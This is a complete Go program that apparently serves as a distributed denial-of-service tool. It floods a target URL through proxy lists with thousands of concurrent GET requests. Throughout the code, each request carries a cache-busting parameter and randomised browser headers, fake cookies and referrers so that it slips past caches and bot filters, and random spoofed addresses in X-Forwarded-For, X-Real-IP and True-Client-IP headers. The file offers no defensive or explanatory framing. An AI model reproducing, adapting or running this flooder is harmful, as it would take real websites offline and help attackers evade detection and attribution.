package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	wrk = 1500
	to  = 6 * time.Second
	sub = 5
)

var UA = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edge/12.0",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edge/12.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edge/12.0",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edge/12.0",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edge/12.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edge/12.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edge/12.0",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edge/12.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edge/12.0",
}

var ACC = []string{
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5",
	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7",
	"application/json",
	"*/*",
}

var LAN = []string{
	"ko-KR", "en-US", "zh-CN", "zh-TW", "ja-JP", "en-GB", "en-AU",
	"en-GB,en-US;q=0.9,en;q=0.8", "en-GB,en;q=0.5", "en-CA",
	"en-UK, en, de;q=0.5", "en-NZ", "en-GB,en;q=0.6", "en-ZA",
	"en-IN", "en-PH", "en-SG", "en-HK", "en-GB,en;q=0.8",
	"en-GB,en;q=0.9", " en-GB,en;q=0.7", "*", "en-US,en;q=0.5",
	"vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
	"utf-8, iso-8859-1;q=0.5, *;q=0.1",
	"fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
	"en-GB, en-US, en;q=0.9", "de-AT, de-DE;q=0.9, en;q=0.5",
	"cs;q=0.5", "da, en-gb;q=0.8, en;q=0.7",
	"he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "en-US,en;q=0.9",
	"de-CH;q=0.7", "tr", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
}

var ENC = []string{
	"*", "*/*", "gzip", "gzip, deflate, br", "compress, gzip",
	"deflate, gzip", "gzip, identity", "gzip, deflate", "br",
	"br;q=1.0, gzip;q=0.8, *;q=0.1",
	"gzip;q=1.0, identity; q=0.5, *;q=0",
	"gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25",
	"compress;q=0.5, gzip;q=1.0", "identity", "gzip, compress",
	"compress, deflate", "compress", "gzip, deflate, br", "deflate",
	"gzip, deflate, lzma, sdch", "deflate",
}

var CTRL = []string{
	"max-age=604800", "proxy-revalidate", "public, max-age=0",
	"max-age=315360000", "public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800",
	"s-maxage=604800", "max-stale", "public, immutable, max-age=31536000",
	"must-revalidate", "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0",
	"max-age=31536000,public,immutable", "max-age=31536000,public",
	"min-fresh", "private", "public", "s-maxage", "no-cache",
	"no-cache, no-transform", "max-age=2592000", "no-store", "no-transform",
	"max-age=31557600", "stale-if-error", "only-if-cached", "max-age=0",
}

var REF = []string{
	"https://www.google.com/search?q=",
	"https://check-host.net/",
	"https://www.facebook.com/",
	"https://www.youtube.com/",
	"https://www.bing.com/search?q=",
	"https://r.search.yahoo.com/",
	"https://www.cia.gov/index.html",
	"https://vk.com/profile.php?redirect=",
	"https://steamcommunity.com/market/search?q=",
	"https://www.ted.com/search?q=",
	"https://play.google.com/store/search?q=",
	"https://www.qwant.com/search?q=",
}

var SITE = []string{"cross-site", "same-origin", "same-site", "none"}
var MODE = []string{"cors", "navigate", "no-cors", "same-origin"}
var DEST = []string{"document", "image", "embed", "empty", "frame"}

var CBP = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t"}
var COOKIES = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token"}

type CLI struct {
	client *http.Client
	ip     string
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func randstr(length int) string {
	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func randomElement(arr []string) string {
	return arr[rand.Intn(len(arr))]
}

func ipSpoof() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
}

func HIN(ua string) (string, string, string) {
	scu := `"Not?A_Brand";v="99"`
	scm := "?0"
	scp := "Windows"

	if strings.Contains(ua, "Chrome/") {
		idx := strings.Index(ua, "Chrome/")
		if idx != -1 {
			start := idx + len("Chrome/")
			end := strings.Index(ua[start:], " ")
			if end == -1 {
				end = len(ua[start:])
			}
			version := ua[start : start+end]
			parts := strings.Split(version, ".")
			if len(parts) > 0 {
				major := parts[0]
				scu = fmt.Sprintf(`"Chromium";v="%s", "Google Chrome";v="%s", "Not?A_Brand";v="99"`, major, major)
			}
		}
	} else if strings.Contains(ua, "Edg/") {
		idx := strings.Index(ua, "Edg/")
		if idx != -1 {
			start := idx + len("Edg/")
			end := strings.Index(ua[start:], " ")
			if end == -1 {
				end = len(ua[start:])
			}
			version := ua[start : start+end]
			parts := strings.Split(version, ".")
			if len(parts) > 0 {
				major := parts[0]
				scu = fmt.Sprintf(`"Chromium";v="%s", "Microsoft Edge";v="%s", "Not?A_Brand";v="99"`, major, major)
			}
		}
	} else if strings.Contains(ua, "OPR/") {
		idx := strings.Index(ua, "OPR/")
		if idx != -1 {
			start := idx + len("OPR/")
			end := strings.Index(ua[start:], " ")
			if end == -1 {
				end = len(ua[start:])
			}
			version := ua[start : start+end]
			parts := strings.Split(version, ".")
			if len(parts) > 0 {
				major := parts[0]
				scu = fmt.Sprintf(`"Chromium";v="%s", "Opera";v="%s", "Not?A_Brand";v="99"`, major, major)
			}
		}
	} else {
		scu = ""
	}

	if strings.Contains(ua, "Android") || strings.Contains(ua, "iPhone") || strings.Contains(ua, "iPad") {
		scm = "?1"
		if strings.Contains(ua, "Android") {
			scp = "Android"
		} else {
			scp = "iOS"
		}
	} else if strings.Contains(ua, "Windows") {
		scp = "Windows"
	} else if strings.Contains(ua, "Macintosh") || strings.Contains(ua, "Mac OS X") {
		scp = "macOS"
	} else if strings.Contains(ua, "Linux") {
		scp = "Linux"
	}
	return scu, scm, scp
}

func main() {
	if len(os.Args) < 6 {
		fmt.Println("Usage: target time rate thread proxyfile")
		os.Exit(1)
	}

	tgt := os.Args[1]
	dur := 0
	if len(os.Args) >= 3 {
		if d, err := strconv.Atoi(os.Args[2]); err == nil && d > 0 {
			dur = d
		}
	}

	parsed, _ := url.Parse(tgt)
	host := parsed.Hostname()

	var proxies []*url.URL
	proxyFile := os.Args[5]
	file, err := os.Open(proxyFile)
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
				line = "http://" + line
			}
			if p, err := url.Parse(line); err == nil {
				proxies = append(proxies, p)
			}
		}
	}
	if len(proxies) == 0 {
		proxies = append(proxies, nil)
	}

	wcs := make([]CLI, len(proxies))
	for i, PROXYLINK := range proxies {
		tr := &http.Transport{
			DialContext: (&net.Dialer{
				Timeout:   5 * time.Second,
				KeepAlive: 30 * time.Second,
			}).DialContext,
			DisableKeepAlives:      false,
			MaxIdleConns:           10000,
			MaxIdleConnsPerHost:    5000,
			MaxConnsPerHost:        0,
			IdleConnTimeout:        60 * time.Second,
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				MinVersion:         tls.VersionTLS12,
				MaxVersion:         tls.VersionTLS13,
				NextProtos:         []string{"h2"},
			},
			ForceAttemptHTTP2:     true,
			DisableCompression:    true,
			TLSHandshakeTimeout:   4 * time.Second,
			ResponseHeaderTimeout: 3 * time.Second,
			ExpectContinueTimeout: 0,
		}
		ip := ""
		if PROXYLINK != nil {
			tr.Proxy = http.ProxyURL(PROXYLINK)
			ip = PROXYLINK.Hostname()
		}
		client := &http.Client{
			Transport: tr,
			Timeout:   to,
			Jar:       nil,
		}
		wcs[i] = CLI{client: client, ip: ip}
	}

	ctx, cancel := context.WithCancel(context.Background())
	var wg sync.WaitGroup

	if dur > 0 {
		time.AfterFunc(time.Duration(dur)*time.Second, func() {
			cancel()
		})
	}

	for i := 0; i < wrk; i++ {
		wg.Add(1)
		c := wcs[i%len(wcs)]
		go func(cli CLI) {
			defer wg.Done()
			var swg sync.WaitGroup
			for s := 0; s < sub; s++ {
				swg.Add(1)
				go func() {
					defer swg.Done()
					for ctx.Err() == nil {
						param := CBP[rand.Intn(len(CBP))]
						reqURL := tgt
						if strings.Contains(reqURL, "?") {
							reqURL += "&" + param + "=" + fmt.Sprintf("%d", rand.Int63())
						} else {
							reqURL += "?" + param + "=" + fmt.Sprintf("%d", rand.Int63())
						}
						if rand.Intn(5) == 0 {
							reqURL += "&big=" + strings.Repeat("x", 1024+rand.Intn(1024))
						}
						req, _ := http.NewRequest("GET", reqURL, nil)

						ua := UA[rand.Intn(len(UA))]
						ACCEPT := ACC[rand.Intn(len(ACC))]
						lang := LAN[rand.Intn(len(LAN))]
						enc := ENC[rand.Intn(len(ENC))]
						ctrl := CTRL[rand.Intn(len(CTRL))]

						req.Header.Set("User-Agent", ua)
						req.Header.Set("Accept", ACCEPT)
						req.Header.Set("Accept-Language", lang)
						req.Header.Set("Accept-Encoding", enc)
						req.Header.Set("Connection", "keep-alive")
						req.Header.Set("Cache-Control", ctrl)
						req.Header.Set("Pragma", "no-cache")
						req.Header.Set("Upgrade-Insecure-Requests", "1")
						req.Header.Set("If-Modified-Since", time.Now().AddDate(1, 0, 0).Format(time.RFC1123))
						req.Header.Set("X-Cache-Buster", fmt.Sprintf("%x", rand.Int63()))

						if rand.Intn(3) == 0 {
							req.Header.Set("X-Original-URL", "/"+fmt.Sprintf("%x", rand.Int63()))
						}
						if rand.Intn(3) == 0 {
							req.Header.Set("X-Forwarded-Host", fmt.Sprintf("%x.example.com", rand.Int63()))
						}

						var cookies []string
						for _, name := range COOKIES {
							if rand.Intn(2) == 0 {
								cookies = append(cookies, name+"="+fmt.Sprintf("%x", rand.Int63()))
							}
						}
						if len(cookies) > 0 {
							req.Header.Set("Cookie", strings.Join(cookies, "; "))
						}

						if rand.Intn(8) != 0 {
							ref := REF[rand.Intn(len(REF))]
							req.Header.Set("Referer", ref+host)
						}

						if strings.Contains(ua, "Chrome/") || strings.Contains(ua, "Edg/") || strings.Contains(ua, "OPR/") {
							scu, scm, scp := HIN(ua)
							if scu != "" {
								req.Header.Set("Sec-Ch-Ua", scu)
								req.Header.Set("Sec-Ch-Ua-Mobile", scm)
								req.Header.Set("Sec-Ch-Ua-Platform", scp)
							}
						}
						req.Header.Set("Sec-Fetch-Site", SITE[rand.Intn(len(SITE))])
						req.Header.Set("Sec-Fetch-Mode", MODE[rand.Intn(len(MODE))])
						req.Header.Set("Sec-Fetch-Dest", DEST[rand.Intn(len(DEST))])

						PID := cli.ip
						if PID == "" {
							PID = ipSpoof()
						}
						req.Header.Set("X-Forwarded-For", PID)
						req.Header.Set("X-Real-IP", PID)
						req.Header.Set("True-Client-IP", PID)

						resp, err := cli.client.Do(req)
						if err == nil {
							io.Copy(io.Discard, resp.Body)
							resp.Body.Close()
						}
					}
				}()
			}
			swg.Wait()
		}(c)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	select {
	case <-sig:
		cancel()
	case <-ctx.Done():
	}
	wg.Wait()
}
